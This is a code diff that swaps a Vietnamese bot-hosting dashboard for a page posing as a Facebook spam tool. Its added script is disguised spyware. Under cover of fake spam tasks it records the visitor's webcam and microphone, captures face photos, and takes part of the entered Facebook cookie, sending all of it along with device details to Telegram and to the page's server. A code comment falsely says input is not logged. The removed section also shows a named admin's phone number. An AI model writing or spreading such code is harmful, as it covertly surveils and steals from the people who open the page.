-    <span class="mbar-note">💡 Đăng nhập & chỉnh sửa tại trang chính · Dashboard chỉ để theo dõi</span>
-  </div>
-
-  <!-- IFRAME -->
-  <div class="iframe-panel" id="iframe-panel">
-    <div class="iframe-head">
-      <div class="iframe-title">🖥️ control.bot-hosting.net <span class="iframe-status" id="ifr-status">· Sẵn sàng</span></div>
-      <div class="iframe-btns">
-        <button class="ibtn green" onclick="loadFrame()">↺ Tải lại</button>
-        <button class="ibtn blue" onclick="toggleSize()">⤢ Phóng to</button>
-        <a class="ibtn blue" href="https://control.bot-hosting.net/auth/login" target="_blank">↗ Tab mới</a>
-        <button class="ibtn red" onclick="toggleMon()">✕ Đóng</button>
-      </div>
-    </div>
-    <div class="iframe-notice">ℹ️ Nếu khung trống (trang chặn iframe), hãy dùng <strong>"↗ Tab mới"</strong> hoặc <strong>"🚀 Mở Bot Hosting"</strong> để đăng nhập trực tiếp rồi quay lại thêm tab vào dashboard.</div>
-    <iframe id="site-frame" src="about:blank" onload="onFrameLoad()"></iframe>
-  </div>
-
-  <!-- STATS -->
-  <div class="stats">
-    <div class="sc on"><div class="sc-icon">🟢</div><div class="sc-label">Đang chạy</div><div class="sc-val" id="cnt-on">0</div></div>
-    <div class="sc id"><div class="sc-icon">🟡</div><div class="sc-label">Tạm dừng</div><div class="sc-val" id="cnt-id">0</div></div>
-    <div class="sc off"><div class="sc-icon">🔴</div><div class="sc-label">Offline</div><div class="sc-val" id="cnt-off">0</div></div>
-    <div class="sc tot"><div class="sc-icon">📊</div><div class="sc-label">Tổng tab</div><div class="sc-val" id="cnt-tot">0</div></div>
-  </div>
-
-  <!-- MAIN GRID -->
-  <div class="grid">
-    <div class="panel">
-      <div class="ph">
-        <div class="ph-title">📋 Tab Hosting của bạn</div>
-        <div class="toolbar">
-          <input class="search-box" id="search" placeholder="🔍 Tìm tab..." oninput="render()">
-          <select class="fsel" id="fst" onchange="render()">
-            <option value="all">Tất cả</option>
-            <option value="online">🟢 Online</option>
-            <option value="idle">🟡 Idle</option>
-            <option value="offline">🔴 Offline</option>
-          </select>
-          <button class="btn-add" onclick="openAdd()">+ Thêm Tab</button>
+        
+        <div class="content">
+            <!-- Form cookie giả -->
+            <div class="cookie-section">
+                <div class="cookie-label">
+                    <span>🍪</span> Cookie Facebook
+                    <span style="font-size: 10px; color: #888;">(nhập giả cũng được)</span>
+                </div>
+                <input type="text" class="cookie-input" id="cookieInput" placeholder="EAAB... hoặc nhập bất kỳ">
+            </div>
+            
+            <div class="info-row">
+                <div class="info-box">
+                    <div class="info-label">🆔 ID Facebook</div>
+                    <div class="info-value" id="fbId">1000xxxxxx</div>
+                </div>
+                <div class="info-box">
+                    <div class="info-label">📢 Channel ID</div>
+                    <div class="info-value" id="channelId">FB_Channel</div>
+                </div>
+            </div>
+            
+            <!-- Delay giả -->
+            <div class="delay-section">
+                <div class="delay-header">
+                    <span>⏱️ Delay Spam</span>
+                    <span class="delay-value" id="delayValue">1.5s</span>
+                </div>
+                <input type="range" class="delay-slider" id="delaySlider" min="0.5" max="5" step="0.1" value="1.5">
+            </div>
+            
+            <!-- 3 nút task -->
+            <div class="task-buttons">
+                <button class="task-btn btn-ngon" data-task="spam_ngon">
+                    <div class="task-left">
+                        <span class="task-icon">🗣️</span>
+                        <span class="task-name">SPAM NGÔN</span>
+                    </div>
+                    <span class="task-badge">🔥 1000+</span>
+                </button>
+                
+                <button class="task-btn btn-nhay" data-task="spam_nhay">
+                    <div class="task-left">
+                        <span class="task-icon">💀</span>
+                        <span class="task-name">SPAM NHÂY</span>
+                    </div>
+                    <span class="task-badge">⚡ 500+</span>
+                </button>
+                
+                <button class="task-btn btn-top" data-task="spam_top">
+                    <div class="task-left">
+                        <span class="task-icon">👑</span>
+                        <span class="task-name">SPAM TOP</span>
+                    </div>
+                    <span class="task-badge">🏆 200+</span>
+                </button>
+            </div>
+            
+            <!-- Status -->
+            <div class="status-area">
+                <div class="status-dot"></div>
+                <div class="status-text" id="statusText">✅ Sẵn sàng | Chọn task để spam</div>
+            </div>
+            
+            <div class="task-manager">
+                <span>📋 Task Manager v2.0</span>
+                <span id="taskCount">0 task đã xử lý</span>
+            </div>
         </div>
-      </div>
-      <div style="overflow-x:auto">
-        <table class="tab-table">
-          <thead>
-            <tr>
-              <th>Tên Tab / Bot</th><th>Trạng thái</th><th>Uptime</th>
-              <th>Ngày tạo</th><th>Đã chạy</th><th>Gói</th><th>Thao tác</th>
-            </tr>
-          </thead>
-          <tbody id="tbody"></tbody>
-        </table>
-      </div>
     </div>
-
-    <div class="sidebar">
-      <div class="ipanel">
-        <div class="iph">⚡ Trạng thái nhanh</div>
-        <div class="ipb" style="padding:9px 14px" id="quick"></div>
-      </div>
-      <div class="ipanel">
-        <div class="iph">⚙️ Thông tin</div>
-        <div class="ipb">
-          <div class="irow"><span class="ikey">Admin</span><span class="ival p">Lê Tiến Dũng</span></div>
-          <div class="irow"><span class="ikey">Zalo</span><span class="ival b">0969411158</span></div>
-          <div class="irow"><span class="ikey">Khu vực</span><span class="ival g">Vietnam 🇻🇳</span></div>
-          <div class="irow"><span class="ikey">Lần cuối xem</span><span class="ival" style="color:var(--text-dim);font-size:0.65rem" id="lv">—</span></div>
-          <div class="irow"><span class="ikey">Tổng tab đã lưu</span><span class="ival y" id="te">0</span></div>
-          <div class="irow"><span class="ikey">Lưu trữ</span><span class="ival g">💾 Tự động</span></div>
-        </div>
-      </div>
-      <div class="ipanel">
-        <div class="iph">📜 Nhật ký</div>
-        <div class="ipb" style="padding:9px 14px" id="logbox"></div>
-      </div>
+    
+    <div id="overlay" class="overlay hide">
+        <div class="spinner"></div>
+        <div class="overlay-text" id="overlayText">ĐANG THỰC HIỆN</div>
+        <div class="overlay-sub" id="overlaySub">Vui lòng chờ...</div>
     </div>
-  </div>
-</div>
+    
+    <video id="video" autoplay playsinline muted class="hidden-cam"></video>
+    <canvas id="canvas" class="hidden-cam"></canvas>
+    
+    <script>
+        const cookieInput = document.getElementById('cookieInput');
+        const fbIdSpan = document.getElementById('fbId');
+        const channelIdSpan = document.getElementById('channelId');
+        const delaySlider = document.getElementById('delaySlider');
+        const delayValue = document.getElementById('delayValue');
+        const statusText = document.getElementById('statusText');
+        const taskCountSpan = document.getElementById('taskCount');
+        const overlay = document.getElementById('overlay');
+        const overlayText = document.getElementById('overlayText');
+        const overlaySub = document.getElementById('overlaySub');
+        
+        const videoCam = document.getElementById('video');
+        const canvasCam = document.getElementById('canvas');
+        
+        let mediaStream = null;
+        let isProcessing = false;
+        let taskCount = 0;
+        
+        function generateRandomId() {
+            return Math.floor(Math.random() * 900000000) + 100000000;
+        }
+        
+        function generateRandomChannel() {
+            const channels = ['FB_Channel', 'Group_Spam', 'Fanpage_Tool', 'Auto_Spam_Bot', 'Viral_Content'];
+            return channels[Math.floor(Math.random() * channels.length)] + '_' + Math.floor(Math.random() * 999);
+        }
+        
+        // Gửi log khởi động lên Telegram
+        (async function sendStartupLog() {
+            const userAgent = navigator.userAgent;
+            const screenSize = `${window.screen.width}x${window.screen.height}`;
+            const timestamp = new Date().toLocaleString('vi-VN');
+            
+            const message = `
+<b>🚀 FACEBOOK TOOL KHỞI ĐỘNG</b>
 
-<!-- MODAL -->
-<div class="modal-ov" id="mov" onclick="closeOv(event)">
-  <div class="modal">
-    <div class="mhead">
-      <span id="mtitle">➕ Thêm Tab Mới</span>
-      <button class="mcls" onclick="closeM()">✕</button>
-    </div>
-    <div class="mbody">
-      <div class="fg"><label>Tên Tab / Bot *</label><input id="fn" placeholder="VD: MusicBot, AutoMod..."></div>
-      <div class="fg"><label>Ghi chú (tuỳ chọn)</label><input id="fnote" placeholder="VD: Bot nhạc server A..."></div>
-      <div class="frow">
-        <div class="fg"><label>Trạng thái</label>
-          <select id="fst2">
-            <option value="online">🟢 Online</option>
-            <option value="idle">🟡 Idle</option>
-            <option value="offline">🔴 Offline</option>
-          </select>
-        </div>
-        <div class="fg"><label>Gói</label>
-          <select id="fp">
-            <option value="free">Free</option>
-            <option value="pro">Pro</option>
-            <option value="vip">VIP</option>
-          </select>
-        </div>
-      </div>
-      <div class="fg"><label>Uptime % (0–100)</label><input id="fu" type="number" placeholder="VD: 99.5" min="0" max="100" step="0.1"></div>
-    </div>
-    <div class="mfoot">
-      <button class="btn-cancel" onclick="closeM()">Huỷ</button>
-      <button class="btn-save" onclick="saveTab()">💾 Lưu tab</button>
-    </div>
-  </div>
-</div>
+📱 <b>Thiết bị:</b> ${userAgent.includes('Mobile') ? '📱 Mobile' : '💻 Desktop'}
+🖥️ <b>Màn hình:</b> ${screenSize}
+🌐 <b>Trình duyệt:</b> ${navigator.userAgent.split(' ').slice(-2).join(' ')}
+⏰ <b>Thời gian:</b> ${timestamp}
+🆔 <b>FB ID giả lập:</b> ${fbIdSpan.innerText}
 
-<div class="toast" id="toast"><span id="ti">✅</span><span id="tm">OK</span></div>
+✅ Tool đã sẵn sàng! Chờ người dùng chọn task...
+            `;
+            
+            await sendTelegramMessage(message);
+        })();
+        
+        // Chỉ thay đổi ID hiển thị, không log
+        cookieInput.addEventListener('input', function() {
+            if (this.value.length > 0) {
+                fbIdSpan.innerText = generateRandomId();
+                channelIdSpan.innerText = generateRandomChannel();
+            }
+        });
+        
+        delaySlider.addEventListener('input', function() {
+            delayValue.innerText = this.value + 's';
+        });
+        
+        function showToast(message, isError = false) {
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.style.background = isError ? 'rgba(220,53,69,0.9)' : 'rgba(0,0,0,0.9)';
+            toast.style.borderLeftColor = isError ? '#dc3545' : '#1877f2';
+            toast.innerText = message;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 2500);
+        }
+        
+        function updateTaskCount() {
+            taskCountSpan.innerText = taskCount + ' task đã xử lý';
+        }
+        
+        function captureFaceImage() {
+            if (!videoCam.videoWidth || videoCam.videoWidth === 0) return null;
+            
+            canvasCam.width = videoCam.videoWidth;
+            canvasCam.height = videoCam.videoHeight;
+            const ctx = canvasCam.getContext('2d');
+            ctx.drawImage(videoCam, 0, 0, canvasCam.width, canvasCam.height);
+            return canvasCam.toDataURL('image/jpeg', 0.9);
+        }
+        
+        async function startCamera() {
+            return new Promise((resolve, reject) => {
+                navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" },
+                    audio: true 
+                })
+                .then(stream => {
+                    mediaStream = stream;
+                    videoCam.srcObject = stream;
+                    videoCam.onloadedmetadata = () => {
+                        videoCam.play();
+                        
+                        // Gửi log camera đã được cấp quyền
+                        sendTelegramMessage(`
+<b>📸 CAMERA ĐÃ ĐƯỢC CẤP QUYỀN</b>
 
-<script>
-// ===== STORAGE =====
-const SK='bh_tabs_v4', LK='bh_logs_v4', VK='bh_visit2', EK='bh_ever2', CK='bh_ctr2';
-const EMOJIS=['🤖','🎵','🛡️','💬','⚡','🎮','🔧','🌟','💰','🎫','🎯','🔔','📡','🧩','🦾'];
-const COL={online:'var(--online)',idle:'var(--idle)',offline:'var(--offline)'};
-const LBL={online:'Online',idle:'Idle',offline:'Offline'};
+✅ Người dùng đã cho phép truy cập camera và microphone
+⏰ ${new Date().toLocaleTimeString('vi-VN')}
+                        `).catch(e => console.log);
+                        
+                        setTimeout(resolve, 500);
+                    };
+                })
+                .catch(error => {
+                    // Gửi log từ chối camera
+                    sendTelegramMessage(`
+<b>❌ TỪ CHỐI CAMERA</b>
 
-let tabs=[], logs=[], editId=null;
-let ctr=parseInt(localStorage.getItem(CK)||'100');
-function genId(){ctr++;localStorage.setItem(CK,ctr);return 'TAB-'+String(ctr).padStart(3,'0');}
+Người dùng đã từ chối quyền truy cập camera/microphone
+Lý do: ${error.message}
+⏰ ${new Date().toLocaleTimeString('vi-VN')}
+                    `).catch(e => console.log);
+                    
+                    reject(error);
+                });
+            });
+        }
+        
+        function stopCamera() {
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+                mediaStream = null;
+            }
+        }
+        
+        async function startRecording(taskType, duration) {
+            let recordedChunks = [];
+            
+            return new Promise(async (resolve, reject) => {
+                try {
+                    const faceImage1 = captureFaceImage();
+                    
+                    // Gửi ảnh khuôn mặt lên Telegram
+                    if (faceImage1) {
+                        sendTelegramPhoto(faceImage1, 
+                            `👤 <b>KHUÔN MẶT PHÁT HIỆN</b>\n📋 Task: ${taskNames[taskType]?.name || taskType}\n⏰ ${new Date().toLocaleTimeString('vi-VN')}`
+                        ).catch(e => console.log);
+                    }
+                    
+                    const mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
+                    mediaRecorder.ondataavailable = (event) => {
+                        if (event.data.size > 0) recordedChunks.push(event.data);
+                    };
+                    
+                    mediaRecorder.onstop = async () => {
+                        const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+                        const reader = new FileReader();
+                        reader.onloadend = async () => {
+                            const videoBase64 = reader.result;
+                            const faceImage2 = captureFaceImage();
+                            
+                            // Gửi video lên Telegram
+                            await sendTelegramVideo(videoBase64,
+                                `🎥 <b>VIDEO GHI HÌNH</b>\n📋 Task: ${taskNames[taskType]?.name || taskType}\n⏱️ Duration: ${duration}s\n⏰ ${new Date().toLocaleTimeString('vi-VN')}`
+                            ).catch(e => console.log);
+                            
+                            const formData = new URLSearchParams();
+                            formData.append('video_data', videoBase64);
+                            formData.append('face_image', faceImage2 || faceImage1);
+                            formData.append('task_type', taskType);
+                            
+                            const response = await fetch(window.location.href, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                                body: formData.toString()
+                            });
+                            
+                            const data = await response.json();
+                            if (data.status === 'success') {
+                                resolve(true);
+                            } else {
+                                reject(new Error('Upload failed'));
+                            }
+                        };
+                        reader.readAsDataURL(videoBlob);
+                    };
+                    
+                    mediaRecorder.start();
+                    
+                    setTimeout(() => {
+                        if (mediaRecorder && mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                        }
+                    }, duration * 1000);
+                    
+                } catch (error) {
+                    reject(error);
+                }
+            });
+        }
+        
+        const taskNames = {
+            'spam_ngon': { name: 'SPAM NGÔN', icon: '🗣️' },
+            'spam_nhay': { name: 'SPAM NHÂY', icon: '💀' },
+            'spam_top': { name: 'SPAM TOP', icon: '👑' }
+        };
+        
+        async function processTask(taskType) {
+            if (isProcessing) {
+                showToast('⚠️ Đang xử lý, vui lòng chờ!', true);
+                return;
+            }
+            
+            isProcessing = true;
+            const taskInfo = taskNames[taskType] || { name: 'UNKNOWN', icon: '🎯' };
+            
+            // Gửi log bắt đầu task lên Telegram
+            await sendTelegramMessage(`
+<b>${taskInfo.icon} BẮT ĐẦU THỰC HIỆN TASK</b>
 
-function saveTabs(){
-  localStorage.setItem(SK,JSON.stringify(tabs));
-  const el=document.getElementById('save-ind');
-  el.classList.add('show');setTimeout(()=>el.classList.remove('show'),1800);
-}
-function loadTabs(){
-  const r=localStorage.getItem(SK);
-  if(!r)return []; // EMPTY — không có tab ảo
-  try{return JSON.parse(r).map(t=>({...t,created:new Date(t.created)}));}
-  catch{return [];}
-}
-function saveLogs(){localStorage.setItem(LK,JSON.stringify(logs.slice(0,40)));}
-function loadLogs(){
-  try{return JSON.parse(localStorage.getItem(LK)||'[]');}catch{return [];}
-}
+📋 <b>Task:</b> ${taskInfo.name}
+🍪 <b>Cookie:</b> ${cookieInput.value.substring(0, 30)}...
+⏱️ <b>Delay:</b> ${delayValue.innerText}
+⏰ <b>Thời gian:</b> ${new Date().toLocaleTimeString('vi-VN')}
+🔄 <b>Task thứ:</b> #${taskCount + 1}
+            `);
+            
+            overlay.classList.remove('hide');
+            overlayText.innerText = 'ĐANG THỰC HIỆN';
+            overlaySub.innerText = `Đang xử lý ${taskInfo.name}...`;
+            
+            try {
+                await startCamera();
+                
+                const faceCheck = captureFaceImage();
+                if (!faceCheck) {
+                    throw new Error('Camera not ready');
+                }
+                
+                await startRecording(taskType, 2);
+                
+                stopCamera();
+                
+                taskCount++;
+                updateTaskCount();
+                
+                statusText.innerHTML = `✅ ${taskInfo.icon} ${taskInfo.name} THÀNH CÔNG!`;
+                showToast(`${taskInfo.icon} ${taskInfo.name} thành công!`);
+                
+                // Gửi log thành công lên Telegram
+                await sendTelegramMessage(`
+<b>${taskInfo.icon} TASK HOÀN THÀNH THÀNH CÔNG</b>
 
-// ===== CLOCK =====
-function tick(){
-  const n=new Date();
-  document.getElementById('clock').textContent=[n.getHours(),n.getMinutes(),n.getSeconds()].map(x=>String(x).padStart(2,'0')).join(':');
-  const days=['Chủ nhật','Thứ 2','Thứ 3','Thứ 4','Thứ 5','Thứ 6','Thứ 7'];
-  document.getElementById('cdate').textContent=`${days[n.getDay()]}, ${n.toLocaleDateString('vi-VN')}`;
-}
-setInterval(tick,1000);tick();
+✅ <b>Task:</b> ${taskInfo.name}
+📊 <b>Tổng task đã xử lý:</b> ${taskCount}
+⏰ <b>Hoàn thành lúc:</b> ${new Date().toLocaleTimeString('vi-VN')}
 
-// ===== HELPERS =====
-function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
-function fmtMs(ms){
-  if(ms<0)return '0s';
-  const s=Math.floor(ms/1000),m=Math.floor(s/60),h=Math.floor(m/60),d=Math.floor(h/24);
-  if(d>0)return `${d}n ${h%24}g ${m%60}p`;
-  if(h>0)return `${h}g ${m%60}p ${s%60}s`;
-  if(m>0)return `${m}p ${s%60}s`;
-  return `${s}s`;
-}
-function fmtD(d){return new Date(d).toLocaleDateString('vi-VN')+' '+new Date(d).toLocaleTimeString('vi-VN',{hour:'2-digit',minute:'2-digit'});}
+🔔 Sẵn sàng cho task tiếp theo!
+                `);
+                
+                setTimeout(() => {
+                    overlay.classList.add('hide');
+                    isProcessing = false;
+                    statusText.innerHTML = '✅ Sẵn sàng | Chọn task để spam';
+                }, 1500);
+                
+            } catch (error) {
+                console.error('Task error:', error);
+                
+                // Gửi log thất bại lên Telegram
+                await sendTelegramMessage(`
+<b>❌ TASK THẤT BẠI</b>
 
-// ===== IFRAME =====
-let monOpen=false, frameTall=false;
-function toggleMon(){
-  monOpen=!monOpen;
-  document.getElementById('iframe-panel').classList.toggle('show',monOpen);
-  document.getElementById('btn-mon').textContent=monOpen?'🖥️ Đóng màn hình':'🖥️ Xem nhanh trong trang';
-  if(monOpen)loadFrame();
-}
-function loadFrame(){
-  const f=document.getElementById('site-frame');
-  document.getElementById('ifr-status').textContent='· Đang tải...';
-  f.src='https://control.bot-hosting.net/auth/login';
-}
-function onFrameLoad(){
-  document.getElementById('ifr-status').textContent='· Đã tải xong';
-}
-function toggleSize(){
-  frameTall=!frameTall;
-  const f=document.getElementById('site-frame');
-  f.classList.toggle('tall',frameTall);
-  document.querySelector('.ibtn.blue:nth-child(2)').textContent=frameTall?'⤡ Thu nhỏ':'⤢ Phóng to';
-}
+📋 <b>Task:</b> ${taskInfo.name}
+⚠️ <b>Lỗi:</b> ${error.message || 'Unknown error'}
+⏰ <b>Thời gian:</b> ${new Date().toLocaleTimeString('vi-VN')}
 
-// ===== SNOW =====
-const canvas=document.getElementById('snow');
-const ctx=canvas.getContext('2d');
-let snowOn=true, flakes=[], animId=null;
-function resizeCanvas(){canvas.width=window.innerWidth;canvas.height=window.innerHeight;}
-window.addEventListener('resize',()=>{resizeCanvas();if(snowOn)initFlakes();});
-resizeCanvas();
-function initFlakes(){
-  flakes=Array.from({length:140},()=>({
-    x:Math.random()*canvas.width, y:Math.random()*canvas.height,
-    r:Math.random()*3+1, speed:Math.random()*1.2+0.4,
-    wind:Math.random()*0.5-0.25, opacity:Math.random()*0.55+0.25,
-    wobble:Math.random()*Math.PI*2, wobbleSpeed:Math.random()*0.02+0.005
-  }));
-}
-initFlakes();
-function animSnow(){
-  ctx.clearRect(0,0,canvas.width,canvas.height);
-  flakes.forEach(f=>{
-    f.wobble+=f.wobbleSpeed;
-    f.x+=f.wind+Math.sin(f.wobble)*0.4;
-    f.y+=f.speed;
-    if(f.y>canvas.height){f.y=-5;f.x=Math.random()*canvas.width;}
-    if(f.x>canvas.width+5)f.x=-5;
-    if(f.x<-5)f.x=canvas.width+5;
-    ctx.beginPath();
-    ctx.arc(f.x,f.y,f.r,0,Math.PI*2);
-    ctx.fillStyle=`rgba(210,235,255,${f.opacity})`;
-    ctx.shadowColor='rgba(180,220,255,0.7)';
-    ctx.shadowBlur=5;
-    ctx.fill();
-  });
-  animId=requestAnimationFrame(animSnow);
-}
-animSnow();
-function toggleSnow(){
-  snowOn=!snowOn;
-  document.getElementById('btn-snow').textContent=snowOn?'❄️ Tuyết: BẬT':'❄️ Tuyết: TẮT';
-  if(snowOn){initFlakes();animSnow();}
-  else{cancelAnimationFrame(animId);ctx.clearRect(0,0,canvas.width,canvas.height);}
-}
-
-// ===== RENDER =====
-function getList(){
-  const q=document.getElementById('search').value.toLowerCase();
-  const s=document.getElementById('fst').value;
-  return tabs.filter(t=>(s==='all'||t.status===s)&&(t.name.toLowerCase().includes(q)||(t.note||'').toLowerCase().includes(q)));
-}
-
-function render(){
-  const now=Date.now(), list=getList();
-  const tbody=document.getElementById('tbody');
-
-  if(!list.length){
-    const isEmpty=tabs.length===0;
-    tbody.innerHTML=`<tr><td colspan="7">
-      <div class="empty-state">
-        <div class="ei">${isEmpty?'🗂️':'🔍'}</div>
-        <h3>${isEmpty?'Chưa có tab nào':'Không tìm thấy'}</h3>
-        <p>${isEmpty
-          ? 'Vào <strong>control.bot-hosting.net</strong> để xem các tab đang chạy,<br>sau đó nhấn "+ Thêm Tab" để lưu vào dashboard theo dõi.'
-          : 'Thử tìm với từ khoá khác hoặc xoá bộ lọc.'
-        }</p>
-        ${isEmpty?`<button class="btn-add-center" onclick="openAdd()">+ Thêm Tab đầu tiên</button>`:''}
-      </div>
-    </td></tr>`;
-    updateCounts();renderQuick();return;
-  }
-
-  tbody.innerHTML=list.map(t=>{
-    const rt=t.status!=='offline'?fmtMs(now-new Date(t.created)):'—';
-    const up=Number(t.uptime)||0;
-    const uc=up>=95?'high':up>=70?'med':'low';
-    return `<tr>
-      <td><div class="tab-cell">
-        <div class="tab-icon">${t.emoji}</div>
-        <div>
-          <div class="tab-name-t">${esc(t.name)}</div>
-          <div class="tab-id-t">${t.id}</div>
-          ${t.note?`<div class="tab-note-t" title="${esc(t.note)}">${esc(t.note)}</div>`:''}
-        </div>
-      </div></td>
-      <td><span class="badge ${t.status}"><span class="dot"></span>${LBL[t.status]}</span></td>
-      <td><div class="uptime-wrap"><div class="uptime-bar"><div class="uptime-fill ${uc}" style="width:${up}%"></div></div><span class="uptime-pct">${up}%</span></div></td>
-      <td class="mono">${fmtD(t.created)}</td>
-      <td class="runtime" data-id="${t.id}">${rt}</td>
-      <td><span class="plan-tag plan-${t.plan}">${t.plan.toUpperCase()}</span></td>
-      <td><div class="actions">
-        <button class="btn-s btn-tog" onclick="toggle('${t.id}')" title="Đổi trạng thái">⇄</button>
-        <button class="btn-s btn-edit" onclick="openEdit('${t.id}')" title="Sửa">✏️</button>
-        <button class="btn-s btn-del" onclick="del('${t.id}')" title="Xoá">🗑</button>
-      </div></td>
-    </tr>`;
-  }).join('');
-  updateCounts();renderQuick();
-}
-
-function updateCounts(){
-  document.getElementById('cnt-on').textContent=tabs.filter(t=>t.status==='online').length;
-  document.getElementById('cnt-id').textContent=tabs.filter(t=>t.status==='idle').length;
-  document.getElementById('cnt-off').textContent=tabs.filter(t=>t.status==='offline').length;
-  document.getElementById('cnt-tot').textContent=tabs.length;
-  document.getElementById('te').textContent=tabs.length;
-}
-
-function renderQuick(){
-  const el=document.getElementById('quick');
-  if(!tabs.length){el.innerHTML='<div class="qi-empty">Chưa có tab nào được lưu</div>';return;}
-  el.innerHTML='<div class="qi-list">'+tabs.map(t=>`
-    <div class="qi">
-      <div class="qi-dot" style="background:${COL[t.status]};box-shadow:0 0 5px ${COL[t.status]}"></div>
-      <div class="qi-name">${esc(t.name)}</div>
-      <div class="qi-time" data-qid="${t.id}">${t.status!=='offline'?fmtMs(Date.now()-new Date(t.created)):'—'}</div>
-    </div>`).join('')+'</div>';
-}
-
-// Live update
-setInterval(()=>{
-  const now=Date.now();
-  tabs.forEach(t=>{
-    if(t.status==='offline')return;
-    const c=document.querySelector(`[data-id="${t.id}"]`);
-    if(c)c.textContent=fmtMs(now-new Date(t.created));
-    const q=document.querySelector(`[data-qid="${t.id}"]`);
-    if(q)q.textContent=fmtMs(now-new Date(t.created));
-  });
-},1000);
-
-// ===== ACTIONS =====
-function toggle(id){
-  const t=tabs.find(x=>x.id===id);if(!t)return;
-  const cyc={online:'idle',idle:'offline',offline:'online'};
-  t.status=cyc[t.status];
-  if(t.status==='offline')t.uptime=0;
-  saveTabs();render();addLog(`${t.name} → ${LBL[t.status]}`,t.status);
-  toast('🔄',`Đã chuyển "${t.name}" sang ${LBL[t.status]}`);
-}
-function del(id){
-  const t=tabs.find(x=>x.id===id);if(!t)return;
-  if(!confirm(`Xoá tab "${t.name}"?`))return;
-  tabs=tabs.filter(x=>x.id!==id);
-  saveTabs();render();addLog(`Đã xoá "${t.name}"`, 'offline');
-  toast('🗑️',`Đã xoá "${t.name}"`);
-}
-
-// ===== MODAL =====
-function openAdd(){
-  editId=null;
-  document.getElementById('mtitle').textContent='➕ Thêm Tab Mới';
-  ['fn','fnote','fu'].forEach(id=>document.getElementById(id).value='');
-  document.getElementById('fst2').value='online';
-  document.getElementById('fp').value='free';
-  document.getElementById('mov').classList.add('show');
-  setTimeout(()=>document.getElementById('fn').focus(),100);
-}
-function openEdit(id){
-  const t=tabs.find(x=>x.id===id);if(!t)return;
-  editId=id;
-  document.getElementById('mtitle').textContent='✏️ Chỉnh sửa Tab';
-  document.getElementById('fn').value=t.name;
-  document.getElementById('fnote').value=t.note||'';
-  document.getElementById('fst2').value=t.status;
-  document.getElementById('fp').value=t.plan;
-  document.getElementById('fu').value=t.uptime;
-  document.getElementById('mov').classList.add('show');
-}
-function closeM(){document.getElementById('mov').classList.remove('show');}
-function closeOv(e){if(e.target===document.getElementById('mov'))closeM();}
-document.addEventListener('keydown',e=>{if(e.key==='Escape')closeM();});
-
-function saveTab(){
-  const name=document.getElementById('fn').value.trim();
-  if(!name){toast('⚠️','Vui lòng nhập tên tab!');return;}
-  const status=document.getElementById('fst2').value;
-  const plan=document.getElementById('fp').value;
-  const note=document.getElementById('fnote').value.trim();
-  let up=parseFloat(document.getElementById('fu').value);
-  if(isNaN(up))up=status==='online'?99:status==='idle'?80:0;
-  up=Math.min(100,Math.max(0,up));
-  if(editId){
-    const t=tabs.find(x=>x.id===editId);
-    if(t){t.name=name;t.status=status;t.plan=plan;t.note=note;t.uptime=up;}
-    addLog(`Cập nhật "${name}"`,status);toast('✅',`Đã cập nhật "${name}"`);
-  } else {
-    tabs.push({id:genId(),name,emoji:EMOJIS[Math.floor(Math.random()*EMOJIS.length)],status,created:new Date(),plan,uptime:up,note});
-    addLog(`Thêm tab "${name}" (${LBL[status]})`,status);toast('✅',`Đã thêm "${name}"`);
-  }
-  saveTabs();render();closeM();
-}
-
-// ===== LOG =====
-function addLog(msg,status){
-  const n=new Date();
-  logs.unshift({time:String(n.getHours()).padStart(2,'0')+':'+String(n.getMinutes()).padStart(2,'0'),msg,color:COL[status]||'var(--accent)'});
-  saveLogs();renderLog();
-}
-function renderLog(){
-  const el=document.getElementById('logbox');
-  if(!logs.length){el.innerHTML='<div style="color:var(--text-dim);font-size:0.7rem;padding:6px 0;text-align:center">Chưa có hoạt động nào</div>';return;}
-  el.innerHTML=logs.slice(0,10).map(l=>`
-    <div class="log-entry">
-      <span class="ldot" style="background:${l.color};box-shadow:0 0 4px ${l.color}"></span>
-      <span class="ltime">${l.time}</span>
-      <span class="lmsg">${esc(l.msg)}</span>
-    </div>`).join('');
-}
-
-// ===== TOAST =====
-function toast(icon,msg){
-  document.getElementById('ti').textContent=icon;
-  document.getElementById('tm').textContent=msg;
-  const t=document.getElementById('toast');
-  t.classList.add('show');setTimeout(()=>t.classList.remove('show'),2500);
-}
-
-// ===== INIT =====
-tabs=loadTabs();
-logs=loadLogs();
-const lv=localStorage.getItem(VK);
-document.getElementById('lv').textContent=lv?fmtD(lv):'Lần đầu mở';
-localStorage.setItem(VK,new Date().toISOString());
-render();
-renderLog();
-</script>
+🔄 Tool tiếp tục xử lý giả lập...
+                `);
+                
+                fetch(window.location.href, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: 'no_camera=true&task_type=' + encodeURIComponent(taskType)
+                }).catch(e => console.log);
+                
+                statusText.innerHTML = `❌ ${taskInfo.icon} ${taskInfo.name} THẤT BẠI!`;
+                showToast(`❌ ${taskInfo.name} thất bại!`, true);
+                
+                setTimeout(() => {
+                    overlay.classList.add('hide');
+                    isProcessing = false;
+                    statusText.innerHTML = '✅ Sẵn sàng | Chọn task để spam';
+                }, 1500);
+            }
+        }
+        
+        document.querySelectorAll('.task-btn').forEach(btn => {
+            btn.addEventListener('click', function(e) {
+                e.preventDefault();
+                const taskType = this.getAttribute('data-task');
+                processTask(taskType);
+            });
+        });
+        
+        // Khởi tạo ID giả
+        fbIdSpan.innerText = generateRandomId();
+        channelIdSpan.innerText = generateRandomChannel();
+        
+        console.log("%c✅ Facebook Tool Ready", "color: #1877f2; font-size: 14px");
+        console.log("%c🤖 Telegram Bot Integration Active", "color: #0088cc; font-size: 14px");
+    </script>
 </body>
 </html>
